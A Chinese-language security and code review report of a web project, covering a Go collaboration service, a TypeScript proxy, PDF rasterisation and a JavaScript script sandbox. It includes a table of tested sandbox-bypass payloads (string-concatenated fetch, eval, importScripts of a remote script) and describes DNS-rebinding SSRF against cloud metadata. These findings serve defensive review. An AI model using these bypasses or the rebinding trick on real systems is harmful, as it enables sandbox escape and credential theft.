## 一、总体判断

单点逻辑质量不低：`proxySecurity.ts` 的 header 过滤、常量时间比较、流式限流、`execFile` 数组参数都做对了；`crdt.ts` 与 `store.go` 的 LWW 语义一致性也保持了。上一版（v49）修的三处阻断确实修好了。

**但系统边界普遍失守。** 四类问题反复出现：

1. **安全边界建立在"字符串里不出现敏感词"上** —— 沙箱黑名单可被字符串拼接绕过（已实测）
2. **"代码写了" 与 "接线通了" 之间存在鸿沟** —— Go 房间服务根本没被前端用上
3. **只限份数不限字节** —— 上传存储、解包缓存都犯过（后者 v49 已修，前者还在）
4. **测试只覆盖纯函数，不覆盖并发、路由、集成** —— 54 条测试没有一条跑过 `server.ts` 的路由或 Go 的并发路径

## 二、阻断问题（6 项）

### B1【功能】协同房间功能整体不可用：Go 服务与前端协议完全不匹配

**最严重的问题，因为整个协同功能从未真正工作过。**

前端 `src/App.tsx:163` 默认地址是 `ws://localhost:8787/ws`，`src/core/roomClient.ts:50` 用 `new WebSocket(fullUrl)`，连接后发 `{t:'hello', room, cid}`。

但 `room-go/` 实际上是 **PeerJS 信令客户端 + WebRTC 应答端**，不是 WebSocket 服务端：

| 核对项 | 实际情况 | 依据 |
| --- | --- | --- |
| 是否有 WS 服务端 | **无** | 全仓库 `grep "Upgrader\|websocket.Upgrade"` 零命中 |
| HTTP 路由 | 只有 `/health` 与 `/dump` | `room.go:744`、`room.go:748` |
| `/ws` 路径 | **不存在** | 前端连上去必然 404 + Upgrade 失败 |
| WebSocket 用途 | **出站**：`dialer.DialContext` 连 `wss://0.peerjs.com/peerjs` | `room.go:109-118`、`room.go:170-183` |
| 是否解析 `hello` | **不解析** | `handleMessage` 只认 `t/upsert/delete/state/request`（`room.go:521-532`），`hello` 落入 `default` 被静默丢弃 |
| 传输层 | WebRTC DataChannel | 与前端"直接 WebSocket"的假设根本不同 |
| 房间模型 | 单固定房间（启动参数 `-room`） | `main.go:67`，而前端是每次连接传 `room` |

**结论**：前端连 Go 服务的 `/ws` 永远失败。`server/server.ts` 里也没有 `/ws` 实现。**仓库内没有任何组件能服务 `roomClient.ts`。**

**影响面**：协同编辑功能全量不可用。用户点"加入房间"只会看到"连接失败"。

**待确认**：这是设计演进中的中间状态，还是当初就该有 WS 服务端而写错了？需要作者确认意图。若 Go 服务本就该是 PeerJS 中继，则前端 `roomClient.ts` 需要重写为 PeerJS 客户端；若要 WS 服务端，则 `room.go` 需要补 `Upgrader`。

### B2【安全】脚本沙箱黑名单可被字符串拼接绕过，实测 7 种写法全部通过

`src/core/scriptSandbox.ts:3-9` 用 26 个 token 做正则 `\btoken\b` 匹配。实测结果：

| 写法 | 结果 |
| --- | --- |
| `fetch("https://x")` | **BLOCKED**（字面量有效） |
| `self["fet"+"ch"]("https://x")` | **PASS（放行）** |
| `self[String.fromCharCode(112,111,115,116,77,101,115,115,97,103,101)]("x")`（拼 postMessage） | **PASS** |
| `({}).valueOf["constr"+"uctor"]("return 1")` | **PASS** |
| `self["import"+"Scripts"]("https://e/x.js")` | **PASS** |
| `self["navi"+"gator"]` | **PASS** |
| `self["ev"+"al"]("1")` | **PASS** |

**根因**：黑名单是"文本级"防护，而 JS 求值是"运行时"的。任何字符串拼接、`fromCharCode`、模板字符串都能让敏感词不出现在源码文本中。

**危害链**：
1. 脚本可拿到 `self`（WorkerGlobalScope 的全部能力）
2. 可用 `importScripts` 加载任意远端脚本
3. 可用 `postMessage` 向主线程发送伪造消息，主线程 `App.tsx:863-` 会据此创建新节点，**新节点携带的 `script` 不再经过信任门禁**，等于把任意脚本"洗白"
4. 可把全部控件 vars（含用户数据）外发到任意域

**影响面**：一旦某脚本被信任（用户点了"信任并启用"），它就突破了沙箱的全部承诺。

**必须说明的定位问题**：当前沙箱**不是安全边界**，只是"防止用户误写网络代码"的便利层。若项目对外宣称"脚本沙箱 / 安全审计"，属误导。

**Worker 内没有的能力**（已确认正确，不依赖黑名单）：`localStorage`、`sessionStorage`、`document.cookie` 在 Worker 全局本就不存在。

### B3【安全】`pdftoppm`/`mutool` 处理不可信 PDF 完全无沙箱

`server/pdfUnpack.ts:77-91` 用 `execFile` 调起 `pdftoppm` 或 `mutool` 光栅化**任何人上传或任意 URL 拉取的 PDF**。

**风险**：
- poppler / mupdf 是解析复杂二进制格式的 C/C++ 程序，历史 CVE 众多（含 RCE 与内存破坏）
- 子进程与 Express **同 uid 运行**，可读 `.env`（含 `PROXY_API_KEY`、`BLUEPRINT_SAVE_KEY`）
- 无网络隔离、无文件系统隔离、无 `seccomp`、无 cgroup 限额

**现有缓解**：`timeout: 45s`、`maxBuffer: 4MB`、`MAX_RENDER_PAGES=200`、固定 144 DPI、`execFile` 数组参数（无 shell 注入）。这些能挡简单 DoS 和命令注入，**不能约束子进程权限**。

**影响面**：自托管部署时，一个恶意 PDF 即可在服务器上执行代码。

**建议**：容器化（禁网、只读挂载、`no-new-privileges`、内存/CPU 限额），并固定 poppler/mupdf 版本、跟踪安全更新。若非必须处理第三方 PDF，应关闭该功能。

---

### B4【安全】SSRF 存在 DNS TOCTOU：校验与连接是两次独立解析

`server/server.ts:199-216`（`/api/proxy`）、`310-318`（`/api/proxy/binary`）、`426-434`（`/api/pdf/unpack`）都用 `dns.lookup` 校验目标是否为私网 IP，然后在 `248`、`329`、`443` 行用 `fetch(target.url.toString())` 出站。

**问题**：`dns.lookup` 的结果只用于"判定是否拒绝"，**从未绑定到实际连接**。Node 的 `fetch`（undici）会自行重新解析域名。两次解析之间存在窗口。

**利用**：攻击者控制域名权威解析，第一次返回公网 IP（通过校验），第二次返回 `127.0.0.1` 或 `169.254.169.254`（打内网或云元数据读 IAM 凭证）。

**已确认正确**：`redirect: 'manual'` 三处出站 fetch 全部加了，重定向这条路已堵死。TOCTOU 是首跳，与重定向无关。

**修复方向**：解析一次后把 IP 直连（undici 自定义 `lookup` 或 `Dispatcher`），并对连接目标 IP 再校验。

---

### B5【安全】白名单为空时代理对任意公网地址完全开放

`server/proxySecurity.ts:214`：

```ts
if (allowedHosts.length > 0 && !hostMatchesAllowlist(host, allowedHosts)) { ... 拒绝 ... }
```

`allowedHosts.length === 0` 时整条判断短路，**任意公网 URL 都放行**（只拦私网 IP）。叠加 B4 就是完整 SSRF。

**加剧因素**：`server.ts:59` 的 `verifyProxyClientToken` 在 `PROXY_CLIENT_TOKEN` 为空时 `return true`，**放行所有调用方**；而全仓库 `grep "x-proxy-token"` 在 `src/` 下**零命中**——**前端从不发送这个 token**。

这意味着：
- 不设 token（默认）→ 代理/上传/解包接口对公网匿名开放
- 设了 token → 前端所有代理请求 401，功能直接坏掉

**这是一个无法两全的配置**：当前实现下，要么不安全，要么不可用。

`server.ts:142-148` 的 `/api/proxy/status` 还会公开返回 `hasUpstreamSecret` 与 `allowedHosts`，等于告诉攻击者当前开了哪些白名单。

### B6【稳定性】上传存储只限份数不限字节，20 × 50MB = 1GB 常驻

`server.ts:287-288`：`MAX_UPLOADED_PDFS = 20`，**无字节常量**；`397-401` 淘汰只看份数。

`PDF_UPLOAD_MAX_BYTES` 是 50MB，所以常驻内存上限是 `20 × 50MB = 1GB`，外加每份 `express.raw` 解析时的峰值拷贝，足以打爆默认堆。

对比：`pdfUnpack.ts` 在 v49 已加 256MB 总预算，**这里漏了**。同一类问题在同一仓库里修了一处、漏了一处。

**附带问题**：`397` 的淘汰用 `uploadedPdfStore.keys().next()`，是 FIFO（最早上传）而非 LRU（最久未用）。注释 `543-544` 描述的是 LRU，但那只在读取路由成立，跨写入路径不一致。

## 四、已确认正确的部分

审查中也核实了不少做对的地方，一并记录，避免后来者重复审查。

**服务端（`proxySecurity.ts`）**
- scheme 限制严格（仅 http/https），嵌入凭证（`user:pass@`）被拒
- URL 与 header 名/值的 CRLF、空字节过滤完整，header 名还有 RFC 7230 token 正则
- 受限 header 不转发（`cookie`/`host`/`content-length`/`transfer-encoding`/`sec-*`/`proxy-*`）
- `readResponseBufferWithLimit` 真按块累加（`total += value.byteLength`），`Content-Length` 只作提前拒绝优化、不作信任依据
- `sanitizeBinaryProxyContentType` 白名单收敛 + 二进制响应带 `nosniff`，可防同源 HTML/SVG XSS
- `injectSecret` 用 `upstreamBase` 原始字符串判定（v42 修复），配置非法时不泄露密钥
- `verifyProxyClientToken` / `verifySaveKey` 均 Buffer 化后 `crypto.timingSafeEqual` 且先比长度

**PDF 解包（`pdfUnpack.ts`）**
- `execFile` 参数数组，用户输入不进入任何参数位，无命令注入
- 临时目录 `mkdtemp` + hex `docId`，无路径穿越，`finally` 递归清理
- 页码三重检查（`Number.isFinite` / `< 0` / `>= length`）
- 256MB 总预算逐出逻辑正确（`keepDocId` 跳过，单份超预算先拒绝）

**脚本运行时（`scriptSandbox.ts`）**
- `self.onmessage` 每次新建局部状态，**无跨脚本订阅串线**
- `settled` 标志防重复 resolve
- `MAX_REACTION_PASSES = 3` 生效
- `depth > 4` 断环生效
- `validateScriptSyntax` 用 `new AsyncFunction` 只编译不执行，不会跑用户代码
- `computeTopologicalOrder` 自环计入入度、不进邻接表；重复边处理正确
- `validateDagConnection` 从 target 出发判环方向正确，自环单独拒绝

**Go 房间服务（`room-go`）**
- 所有共享 map（`conns`/`pending`/`seen`/`ws`/`store.elements`）都有正确锁保护，无裸读写
- 广播**在 RLock 内只拷贝 targets、解锁后才 SendText**，单慢客户端不会锁死房间（这个决策做对了）
- `snapshot` 深拷贝，外部改不到 store
- `removeConn` / `teardown` 资源清理完整
- `seen` 环形窗口有界（4096）
- **store 完全无文件 I/O**，不存在路径穿越与磁盘上限问题
- `url.Values.Encode()` 防住了 room 名对信令 URL 的注入

**其他**
- `main.tsx` 生产构建装 mock API，静态部署下 `/api/proxy*` 由浏览器内 mock 接管（但 `/api/pdf/*` 未覆盖）
- 保护文件 `.github/workflows/deploy-pages.yml`、`src/vite-env.d.ts` 未被交付物污染

## 七、审查方式说明

- 静态阅读全部源文件，重点核对安全边界、并发、资源上限
- **实测验证两项**：沙箱黑名单绕过（7 种写法）、`isPrivateOrReservedIP` IPv6 覆盖（14 个地址）
- **未修改任何文件**，未执行 npm install / build / test，结论基于源码与实测，运行结果以 CI 为准
- 交叉验证：3 个子审查（沙箱、服务端、Go 服务）的结论均回到源码逐条复核。其中「协同增量消息绕过审计」被判为**不成立**（`App.tsx` 只处理 `t === 'state'` 一种消息）
